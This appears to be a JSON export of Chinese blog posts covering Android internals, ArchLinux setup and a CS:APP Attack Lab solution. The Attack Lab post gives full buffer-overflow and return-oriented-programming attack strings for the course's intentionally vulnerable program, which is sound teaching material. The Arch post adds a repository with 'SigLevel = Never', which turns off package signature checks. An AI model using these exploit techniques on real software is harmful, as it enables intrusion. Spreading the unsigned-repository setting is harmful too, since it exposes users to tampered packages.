[{"title":"Android 触摸事件分发机制（一）一切的开始","date":"2017-07-23T05:40:38.000Z","path":"2017/07/23/android_view_event_1/","text":"写在前面本文基于Android 7.1.1 (API 25)的源码分析编写 安卓是基于触摸操作进行交互的系统，几乎所有的操作都由对屏幕的一次次触摸完成，如何正确处理触摸事件关乎整个应用的操作体验。因此安卓对于触摸事件的分发与处理机制也是我们学习安卓开发的重中之重。同时几乎每一个安卓技术博客中都会对触摸分发机制这一块进行详解，例如比较早期也是最为出名的郭霖（《第一行代码》的作者）。现在网络上对于这一块的分析也已经比较详尽了，基本上一篇博客中遗漏的部分都可以在其他博客中找到答案。 但是无论别人的文章讲得多好，多么详细，我们都需要自己去打开源码仔细分析好好体会，一是这样一个比较复杂的过程不经历自己的思考很难完全理解，二是随着api版本的推进这部分源码也会发生很多变化，虽然大致思路相同，但是接触到新的内容总是一件好事。 这也就是我写这篇博文的原因：记录自己思考与分析的过程。 触摸事件的来源","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"http://www.viseator.com/tags/View/"}]},{"title":"Android Context理解与陷阱","date":"2017-07-19T11:07:42.000Z","path":"2017/07/19/android_context/","text":"Context?Context在安卓开发时是一个非常常见的组件，我们会在许多地方使用它，举一些例子： 启动新的Activity Service 发送广播，接收广播 填充View 获取资源 相信每一个开发者在看见它时都有过这样一些疑问： Context是什么 Context的作用 Context从哪里来 同时，我们也经历过需要一个Context但不知道如何去正确获取/传递的情况，事实上不正确地保存一个Context的引用可能会导致部分内存不能被正确GC从而造成事实上的内存泄漏。 本文将着重对上面这些内容进行讲解。 Context的定义字面上解释，Context意为“环境”，这个解释比较符合它的作用。 官方文档中对Context的解释是： Interface to global information about an application environment. This is an abstract class whose implementation is provided by the Android system. It allows access to application-specific resources and classes, as well as up-calls for application-level operations such as launching activities, broadcasting and receiving intents, etc. 关于应用环境的全局信息的接口。它是一个抽象类，具体由安卓系统来实现。它允许我们去访问特定的应用的资源和类，同时也可以经由它去向上请求应用级别的操作例如启动Activity、发送广播、接收intents等等。 我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的Activity，向其他应用发送广播，启动一个新的Service或是访问我们存放在apk中的资源文件。 Context就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。 Context从哪里来Context作为一个依赖于系统的类，SDK中只给了我们一个抽象类，具体的实现由系统完成，下文举例使用的ContextImpl就是AOSP中安卓源码对于Context的一个实现。 Context的作用Context中封装的信息我们可以看看Context里面包含了哪些东西（部分）。 12345678910111213141516171819private final String mBasePackageName; private final String mOpPackageName; //软件包名private final Resources mResources;private final ResourcesManager mResourcesManager; //用于管理资源文件private final Display mDisplay; //为View填充等提供屏幕尺寸、像素密度等信息private final DisplayAdjustments mDisplayAdjustments = new DisplayAdjustments();private Resources.Theme mTheme = null; //主题信息private File mCacheDir;@GuardedBy(\"mSync\")private File mCodeCacheDir;...@GuardedBy(\"mSync\")private File[] mExternalObbDirs;@GuardedBy(\"mSync\")private File[] mExternalFilesDirs;@GuardedBy(\"mSync\")private File[] mExternalCacheDirs;@GuardedBy(\"mSync\")private File[] mExternalMediaDirs; //各种文件路径 这些域的存在为功能提供了必要的信息，例如在LayoutInflater填充View时需要一个context作为参数，我们查看这个context如何被使用： 1final XmlResourceParser childParser = context.getResources().getLayout(layout); 我们传入的ResourceId最终会被通过context的getResource()方法获取的Resource对象的getLayout()方法定位到对应的xml文件提供给Inflater进行解析。 123456789// Apply a theme wrapper, if allowed and one is specified.if (!ignoreThemeAttr) &#123; final TypedArray ta = context.obtainStyledAttributes(attrs, ATTRS_THEME); final int themeResId = ta.getResourceId(0, 0); if (themeResId != 0) &#123; context = new ContextThemeWrapper(context, themeResId); &#125; ta.recycle();&#125; 在这里调用了context的obtainStyledAttributes()方法： 1234public final TypedArray obtainStyledAttributes( AttributeSet set, @StyleableRes int[] attrs) &#123; return getTheme().obtainStyledAttributes(set, attrs, 0, 0);&#125; 最终使用了context中存放的主题信息为填充的view设置属性。 现在我们知道，我们存放在res文件夹下的内容（布局文件、字符串文件、图片、主题……）都需要通过一个context去向系统获取。 那么为什么在启动activity、启动service、发送广播时都需要使用context呢？因为这些操作与系统是紧密相关的，我们知道启动这些东西都需要使用一个叫intent的东西（关于intent的内容会在另外的文章讲），以startActivity()方法为例，我们一路向上追溯，可以发现启动activity最终是由AcitivityManagerNative.getDefault()的本地方法startActivity()执行的： 12345678910try &#123; intent.migrateExtraStreamToClipData(); intent.prepareToLeaveProcess(); int result = ActivityManagerNative.getDefault().startActivity( whoThread, who.getBasePackageName(), intent, intent.resolveTypeIfNeeded(who.getContentResolver()), token, target != null ? target.mEmbeddedID : null, requestCode, 0, null, options); checkStartActivityResult(result, intent);&#125; catch (RemoteException e) &#123;&#125; 这个时候我们发现，传入的context已经变成了上面代码中的who，利用这个 context获取了包名与方法的第四个参数who.getContentResolver()。它的作用是提供信息来解析intent的MIME type，帮助系统决定intent的目标。 可以看到context在这里同样起到了一个提供必要信息的作用。 Context的作用在这里再重复一遍上面说过的话，配合之前的例子，是不是可以更好地理解了呢？ 我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的Activity，向其他应用发送广播，启动一个新的Service或是访问我们存放在apk中的资源文件。 Context就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。 Context的使用Context分类Context并不是都是相同的，根据获取方式的不同，我们得到的Context的各类也有所不同。 Activity/Service我们知道Acitivity类继承自ContextThemeWrapper，ContextThemeWrapper继承自ContextWrapper，最后ContextWrapper继承自Context。顾名思义，ContextWrapper与ContextThemeWrapper只是将Context进行了再次的包装，加入了更多的信息，同时对一些方法做了转发。 所以我们在Activity或Service中需要Context时就可以直接使用this，因为它们本身就是Context。 当系统创建一个新的Activity/Service实例时，它也会创建一个新的ContextImpl实例来封装所有的信息。 对于每一个Activity/Service实例，它们的基础Context都是独立的。 ApplicationApplication同样继承于ContextWrapper，但是Application本身是以单例模式运行在应用进程中的，它可以被任何Activity/Service用getApplication()或是被任何Context使用getApplicationContext()方法获取。 不管使用什么方法去获取Application，获取的总是同一个Application实例。 BroadcastReciverBroadcastReciver本身并不是一个Context或在内部保存了一个Context，但是系统会在每次调用其onRecive()方法时向它传递一个Context对象，这个Context对象是一个ReceiverRestrictedContext（接收器限定Context），与普通Context不同在它的registerReceiver()与bindSerivce()方法是被禁止使用的，这意味着我们不能在onRecive()方法中调用该Context的这两个方法。 每次调用onReceive()方法传递的Context都是全新的。 ContentProvider它本身同样不是一个Context，但它在创建时会被赋予一个Context并可以通过getContext()方法获取。 如果这个内容提供器运行在调用它的应用中，将会返回该应用的Application单例，如果它是由其他应用提供的，返回的Context将会是一个新创建的表示其他应用环境的Context。 使用Context时的陷阱现在我们知道Context的几种分类，其实上面的分类也就是我们获取它的方式。着重标出的内容说明了它们被提供的来源，也暗指了它们的生命周期。 我们常常会在类中保存对Context的引用，但是我们要考虑生命周期的问题：如果被引用的这个Context是一个Acitivity，如果存放这个引用的类的生命周期大于Activity的生命周期，那么Activity在停止使用之后还被这个类引用着，就会引致无法被GC，造成事实上的内存泄露。 举一个例子，如果使用下面的一个单例来保存Context的引用来加载资源： 1234567891011121314151617public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; sInstance = new CustomManager(context); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; 这段程序的问题在于不知道传入的Context会是什么类型的，可能在初始化的时候传入的是一个Activity/Serivce，那么几乎可以肯定的是，这个Activity/Service将不会在结束以后被垃圾回收。如果是一个Activity，那么这意味着与它相关联的View或是其他庞大的类都将留在内存中而不会被回收。 为了避免这样的问题，我们可以改正这个单例： 123456789101112131415161718public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; //Always pass in the Application Context sInstance = new CustomManager(context.getApplicationContext()); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; 我们只修改了一处，第7行中我们使用context.getApplicationContext()这个方法来获取Application这个单例，而不是直接保存context本身，这样就可以保证不会出现某context因为被这个单例引用而不能回收的情况。而Application本身是单例这个特性保证了生命周期的一致，不会造成内存的浪费。 为什么不总是使用application作为context既然它是一个单例，那么我们为什么不直接在任何地方都只使用它呢？ 这是因为各种context的能力有所不同： （图片出处见文末） 对几个注解的地方作说明： 一个application可以启动一个activity，但是需要新建一个task，在特殊情况下可以这么做，但是这不是一个好的行为因为这会导致一个不寻常的返回栈。 虽然这是合法的，但是会导致填充出来的view使用系统默认的主题而不是我们设置的主题。 如果接收器是null的话是被允许的，通常在4.2及以上的版本中用来获取一个粘性广播的当前值。 我们可以发现与UI有关的操作除activity之外都不能完成，在其他地方这些context能做的事情都差不多。 但是我们回过头来想，这三个与UI相关的操作一般都不会在一个activity之外进行，这个特性很大程度上就是系统为我们设计成这样的，如果我们试图去用一个Application去显示一个dialog就会导致异常的抛出和应用的崩溃。 对上面的第二点再进一步解释，虽然我们可以使用application作为context去填充一个view，但是这样填充出的view使用的将会是系统默认的主题，这是因为只有acitivity中才会存有我们定义在manifest中的主题信息，其他的context将会使用默认的主题去填充view。 如何使用正确的Context既然我们不能将Activity作为context保存在另外一个比该Activity生命周期长的类中，那么如果我们需要在这个类中完成与UI有关的操作（比如显示一个dialog）该怎么办？ 如果真的遇到了这样的情况：我们不得不保存一个activity在一个比该Activity生命周期长的类中以进行UI操作，就说明我们的设计是有问题的，系统的设计决定了我们不应该去进行这样的操作。 所以我们可以得出结论： 我们应该在Activity/Service的生命周期范围内直接使用该Activity/Service作为context，在它们的范围之外的类，应该使用Application单例这个context（并且不应该出现UI操作）。 Referencehttps://possiblemobile.com/2013/06/context/ https://web.archive.org/web/20170621005334/http://levinotik.tumblr.com/post/15783237959/demystifying-context-in-android http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/android/app/ContextImpl.java?av=f","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"}]},{"title":"深入理解计算机系统（CS:APP) - Attack Lab详解","date":"2017-07-18T05:47:01.000Z","path":"2017/07/18/CS_APP_AttackLab/","text":"Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个lab开始之后的lab对讲义中内容的依赖还是很强的。 特别提示 本lab的自学者版本需要在运行程序时加上-q参数来避免程序向不存在的评分服务器提交我们的答案导致报错 前置讲义中首先给我们展示了导致程序漏洞的关键：getbuf函数。 123456unsigned getbuf()&#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; getbuf函数在栈中申请了一块BUFFER_SIZE大小的空间，然后利用这块空间首地址作为Gets函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过BUFFER_SIZE的字符串来向getbuf的栈帧之外写入数据。 在代码注入攻击中就是利用函数返回时RET指令会将调用方在栈中存放的返回地址读入IP中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。 第一部分：代码注入攻击Level１在这个等级中，我们不需要注入任何攻击代码，只需要更改getbuf函数的返回地址执行指定的函数touch1（该函数已经存在于程序中）。 那么我们需要做的就是将栈中存放返回地址的位置改为touch1函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。 讲义给出了getbuf的调用函数： 123456void test()&#123; int val; val = getbuf(); printf(\"No exploit. Getbuf returned 0x%x\\n\", val);&#125; 如果攻击成功，我们不会执行到第五行，而是跳转到touch1中执行： 1234567void touch1()&#123; vlevel = 1; /* Part of validation protocol */ printf(\"Touch1!: You called touch1()\\n\"); validate(1); exit(0);&#125; 输出上面的字符串代表我们攻击成功。 下面我们利用objdump -d命令将程序反汇编来查看getbuf函数的行为。 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 代码比较简单，在第2行中将rsp减了0x28，申请了一块28字节的空间，第3行将rsp赋给rdi就是空间的首地址，然后调用了Gets函数，rdi就是它的参数。到这里我们可以确定BUFFER_SIZE的大小为0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在0x28字节的栈被Gets函数写满之后，多出来的字符会被写入getbuf函数的栈外。我们用图来说明栈的结构： 下面是低地址，上面是高地址，在getbuf函数申请的0x28字节内存之外的8个字节存放的就是test函数call指令后下一条指令的地址。 现在我们可以知道，我们需要用0x28字节来将栈填满，再写入touch1函数的入口地址，在getbuf函数执行到ret指令的时候就会返回到touch1中执行。 下面就要利用官方提供的hex2raw程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。 最终的答案如下： 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 可以看到前0x28个字节都使用0x00来填充，然后在溢出的8个字节中写入了touch1的首地址0x4017c0，注意字节序就可以了。 Level 2这个等级中我们同样需要跳转到指定的函数touch2中，但是想要通过touch2需要我们进行一些操作，讲义中给出了touch2的代码： 1234567891011void touch2(unsigned val) &#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); &#125; else &#123; printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); &#125; exit(0);&#125; 这里cookie是服务器给我们的一个数值，存放在cookie.txt文件中，自学者材料中的这个值应该都是一样的。 可以看到touch2拥有一个参数，只有这个参数与cookie的值相等才可以通过这一等级。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用touch2完成攻击。 首先要注意的是touch2的第一个参数存放在寄存器rdi中，我们就是要设置这个寄存器的值为cookie。 那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从getbuf函数返回的地址为我们栈中指令的首地址，在指令中执行ret进行第二次返回，返回到touch2函数，就可以实现我们的目的。 所以我决定将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。 我们利用gdb在运行时查看栈地址： 停在getbuf的这里，然后查看rsp指向的地址： 可以看到首地址为0x5561dc78，顺便看到第6行也就是0x28个字节之后存放的原返回地址。 由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，这里为了避免与我们注入的代码重叠，我选择将touch2地址放在getbuf函数栈的最后8字节中。 下面就要生成攻击字符串了，首先我们需要生成攻击代码。我们先将攻击代码用汇编指令的形式写出来： 123movq $0x59b997fa,%rdi # rdi = cookiemovq $0x5561dc98,%rsp # 将rsp设为存放在栈中的touch2地址的地址ret # 读取rsp指向的地址并跳转 下面利用gcc -c命令将汇编语句编译成机器码，再objdump -d生成的文件就可以间接地看到最终的机器码。 将指令的机器码作为我们攻击字符串的开头，touch2的地址放在栈中第0x20-0x28位置，将栈的首地址放在栈外的8个字节，构成我们的攻击字符串： 12345648 c7 c7 fa 97 b9 59 48 c7 c4 98 dc 61 55 c3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 0078 dc 61 55 00 00 00 00 Level 3该等级同样让我们跳转到touch3函数中，不过touch3函数判断有所不同： 1234567891011121314151617181920/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval) &#123; char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0;&#125;void touch3(char *sval) &#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); &#125; else &#123; printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); &#125; exit(0);&#125; 仔细阅读上面的代码，我们需要传入touch3的参数是一个字符串的首地址，这个地址指向的字符串需要与cookie的字符串表示相同。这里cookie的字符串表示是cookie:0x59b997fa的ASCII表示的字符串：35 39 62 39 39 37 66 61 00。 所以我们需要做的是将这串字符串放入栈中，并且将rdi的值置为字符串的首地址，再进行与上步类似的二次返回操作。 这里我们需要好好考虑目标字符串在栈中的位置，下面是最终结果中的栈结构，先放出来便于讲解。 如果目标字符串存放的位置比touch3存放地址更低，在最终字符串对比的时候会发现rdi指向地址的内容发生了改变。分析原因，我们可以查看从getbuf返回到字符串比对过程中执行的指令： 12345600000000004018fa &lt;touch3&gt;: 4018fa: 53 push %rbx . . . 401911: e8 36 ff ff ff callq 40184c &lt;hexmatch&gt; 1234000000000040184c &lt;hexmatch&gt;: 40184c: 41 54 push %r12 40184e: 55 push %rbp 40184f: 53 push %rbx 上面列出的这部分指令都会向栈中压入新的内容，由于栈向下增长，而rsp一开始的位置在touch3地址的下一个位置，压入的新内容会覆盖touch3地址以下的内容，如果把目标字符串放在这部分会导致内容在比较之前就被覆盖。 知道栈中应该存放的内容的结构，攻击字符串的编写就不再困难了： 12345648 c7 c7 90 dc 61 55 48 # mov $0x5561dc90,%rdi mov $0x5561dc88,%rsp ret 为寄存器赋值并返回c7 c4 88 dc 61 55 c3 00fa 18 40 00 00 00 00 00 # touch3地址35 39 62 39 39 37 66 61 # 目标字符串00 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 # 注入指令首地址 第二部分：返回导向编程攻击我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。 为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式： 栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。 标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。 尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。 攻击方式现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用ret指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下： 我们可以在程序的汇编代码中找到这样的代码： 1230000000000400f15 &lt;setval_210&gt;:400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)400f1b: c3 retq 这段代码的本意是 1234void setval_210(unsigned *p)&#123; *p = 3347663060U;&#125; 这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：48 89 c7 c3又可以代表 12movq %rax, %rdiret 这两条指令（指令的编码可以见讲义中的附录）。 第1行的movq指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是0x400f15，这个地址也是这条指令的地址。我们可以通过计算得出48 89 c7 c3这条指令的首地址是0x400f18，我们只要把这个地址存放在栈中，在执行ret指令的时候就会跳转到这个地址，执行48 89 c7 c3编码的指令。同时，我们可以注意到这个指令的最后是c3编码的是ret指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次ret之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。 这样的一串以ret结尾的指令，被称为gadget。我们要攻击的程序中为我们设置了一个gadget_farm，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中start_farm与end_farm函数标识之间的gadget来构建我们的攻击字符串。 这种攻击方式被称为返回导向编程攻击。 Level 2目的与之前的Level 2相同，我们需要为rdi赋上cookie值，再跳转到touch2函数执行，跳转到touch2只需要将touch2的入口地址放在最后一个gadget之后，在它的ret指令执行之后就会返回到touch2中。 下面就要利用已有的gadget为rdi赋上我们想要的值。这里我们要将一个特定的值写入rdi，但是我们只可以使用栈来存放这个数值，同时不知道栈的地址，这个时候我们可以想到使用pop指令令这个值从栈中弹出到寄存器中。 查看gadget中提供的我们可以执行指令。发现 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 中最后的字节为58 90 c3，这个三个字节分别编码了三条指令： 123popq %raxnopret 这个nop在这里当然不影响，利用这个pop指令我们就可以把栈中存放的内容弹出到rax中。接下来我们需要的是 1movq %rax,%rdi 这条指令，如果没有的话可以多传几次，正好我们发现了 12300000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 中最后的字节48 89 c7 90 c3编码了这样的指令。 我们分别计算这些需要执行的gadget的指令地址，写成攻击字符串： 12345678900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00ab 19 40 00 00 00 00 00 # popq %rax fa 97 b9 59 00 00 00 00 # cookie （popq的目标）a2 19 40 00 00 00 00 00 # movq %rax,%rdiec 17 40 00 00 00 00 00 # 返回到 touch2 Level 3攻击目标与之前的Level 3相同，需要将rdi指向cookie的字符串表示的首地址。 目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？ 查看gadget_farm中提供的gadget后，我们可以发现可以执行的命令中有 12movq %rsp,%raxret 这样一条，可以保存当前的rsp值，但是我们面临一个问题，这条命令执行时rsp的值为下一个地址，如果下一个地址中存放了目标字符串，那么命令就无法继续执行下去，也无法进入touch3函数了。 除此之外，似乎没有别的gadget可以帮助我们获取rsp的地址了。 我在这个地方卡了好几个小时，最后在别人的提示下才发现gadget_farm中有这样一个gadget画风与其他的不太一样： 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 这明明就是一个可以直接使用的函数！它的作用是将rdi与rsi中的值相加后存放在rax中。 有了这个，我们就可以把rsp的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。 同时还要注意的是，这里有些gadget藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。 仔细找出所有可以执行的指令并整理之后我得出了这样一张图： 目标字符串存放的位置一定在touch3地址之上（原因见前文）。 由于相加操作只能对rsi与rdi进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条movl组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把rsp的值存放在rdi中，把偏移量的值通过popq指令从栈中取出放在esi中，再利用add_xy函数将它们相加的结果存放到rax再转移到rdi中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。 根据上面这些信息，我们可以把栈结构示意出来： 标注灰色的地方是我们计算偏移量的部分（从rsp读入时开始），可以计算出偏移量为4 x 8 = 32 = 0x20，再依此计算各命令的地址、构建出我们的攻击字符串： 123456789101112131415161700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00cc 19 40 00 00 00 00 00 # popq %rax20 00 00 00 00 00 00 00 # 偏移量42 1a 40 00 00 00 00 00 # movl %eax,%edx69 1a 40 00 00 00 00 00 # movl %edx,%ecx27 1a 40 00 00 00 00 00 # movl %ecx,%esi06 1a 40 00 00 00 00 00 # movq %rsp,%raxc5 19 40 00 00 00 00 00 # movq %rax,%rdid6 19 40 00 00 00 00 00 # add_xyc5 19 40 00 00 00 00 00 # movq %rax,%rdifa 18 40 00 00 00 00 00 # touch3地址35 39 62 39 39 37 66 61 # 目标字符串00 00 00 00 00 00 00 00 实验小结Attack Lab与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的gadget而忽略了函数本身的作用。 这次实验加强了我对于函数调用栈，字节序，gdb使用，汇编的理解。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"http://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"http://www.viseator.com/tags/CS-APP/"}]},{"title":"ArchLinux你可能需要知道的操作与软件包推荐「持续更新」","date":"2017-07-02T02:26:58.000Z","path":"2017/07/02/arch_more/","text":"你可能需要知道的操作与软件包推荐在第一篇教程中介绍了ArchLinux的基本安装，第二篇教程中介绍了必须的设置与图形界面的安装，这篇文章并不是教程，只是推荐一些自己日常使用的操作与软件包。写这篇文章时没有重新安装，所以不会有详细的过程，只是简单地列举应该装的软件包或者是基础的配置，更加细节的内容请查阅相关wiki。 安装Yaourt在之前我们管理软件包都是使用官方为我们提供的pacman，软件包的来源都是官方。但是Arch拥有一个强大的用户库AUR即Arch User Repository，为我们提供了官方包之外的各种软件包，一些闭源的软件包也可以在上面找到，可以说AUR极大地丰富了软件包的种类与数量，并可以配合yaourt这样的工具为用户省下大量安装、更新软件包的时间。 yaourt实际上也是一个软件包，我们可以把它看成是对pacman的包装，它兼容pacman的所有操作，最大的不同是我们可以用它方便地安装与管理AUR中的包，下面的许多软件包都是在AUR库中的，也都是使用AUR来安装的。 安装yaourt以root权限打开编译/etc/pacman.conf，将下面这三行加入到文件末尾并保存： 123[archlinuxcn]SigLevel = NeverServer = http://repo.archlinuxcn.org/$arch 同步软件信息库并安装yaourt： 1sudo pacman -Sy yaourt fakeroot yaourt使用请见 https://www.linuxdashen.com/arch-linux%E4%BD%BF%E7%94%A8yaourt%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%BD%BB%E6%9D%BE%E5%AE%89%E8%A3%85aur%E8%BD%AF%E4%BB%B6%E5%8C%85 滚动更新ArchLinux的更新机制是非常激进的滚动更新，也就是说ArchLinux的软件与内核会时刻与稳定版本保持一致，你所用的系统总是时刻保持最新的。 这个机制给很多Arch教徒带来了强大的快感，可以第一时间体验到新的软件与新 的内核，但是也存在着日常滚炸这样的问题。虽然滚动更新的包可能因为没有经过完善的测试会导致系统不能工作种种问题，但是绝大部分情况下的更新都不会导致太大的问题。修复滚炸的系统和提交Bug信息也是ArchLinux用户的技能之一。 滚动更新命令使用yaourt非常简单： 1yaourt -Syu --aur --aur参数是检查并更新AUR包中的内容。 shadowsocks安装官方源中的shadowsocks-qt5包，自带图形界面，通过软件菜单（桌面环境自带）启动即可。 Chrome代理安装官方源中开源的chromium或者AUR中的google-chrome都可以，下面以google-chrome为例。 先用命令行代理启动chrome： 1google-chrome-stable --proxy-server=\"socks5://foobar:66\" chromium换下命令就可以。 然后安装SwitchyOmega这个插件，配置好GFWList和代理规则就可以自动代理了。之后的启动就不需要命令行了。 中文字体与中文输入法中文字体推荐安装官方源中noto-fonts-cjk，中文输入法需要安装fcitx包与fcitx-im集合包，再加上一个中文支持包，可以到https://wiki.archlinux.org/index.php/fcitx#Chinese中挑选一个喜欢的包装上。 装完以后需要修改/etc/profile文件，在文件开头加入三行： 123export XMODIFIERS=\"@im=fcitx\"export GTK_IM_MODULE=\"fcitx\"export QT_IM_MODULE=\"fcitx\" 可以解决一些软件无法调出fcitx的问题。 zshzsh是默认shell``bash的替代品之一，它的特点是插件多配置方便，兼容bash脚本并且支持更强大的高亮与补全。 安装官方源中zsh包。 设置zsh为默认shell： 1sudo chsh -s /bin/zsh username 推荐安装AUR中的oh-my-zsh-git这个包，可以帮助配置一些实用的功能。 其他主题插件配置请见oh-my-zsh的配置介绍，分享一下我安装的插件： 1plugins=(vim git sudo extract z wd archlinux zsh-autosuggestions zsh-syntax-highlighting) 注意后面两个插件需要安装相应的支持包并配置才能使用。 SynapseSynapse是一个快速的软件启动器，可以方便地查找安装的软件，设置快捷键使用再也不用找软件入口了。 安装官方源中的synapse包。 YakuakeYakuake是一个终端模拟器，我使用它的原因是它支持下拉，配合快捷键使用非常方便： 安装官方源中的yakuake包。 虚拟机有些时候需要使用windows而不想切换系统或干脆没有windows的情况下，我们可以使用windows虚拟机来代替。当然虚拟机的用处不止于此。 Arch下的虚拟机首先开源的VirtualBox，安装官方源的virtualbox virtualbox-ext-vnc virtualbox-guest-iso virtualbox-host-modules-arch这几个包。 再去官网下载Oracle VM VirtualBox Extension Pack ，在设置中导入使用。安装windows的过程不在这里讲解，记得安装之后在windows内安装扩展客户端软件即可。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"http://www.viseator.com/tags/Arch/"}]},{"title":"深入理解计算机系统（CS:APP) - Bomb Lab详解","date":"2017-06-21T01:53:01.000Z","path":"2017/06/21/CS_APP_BombLab/","text":"Bomb Lab实验代码见GitHub 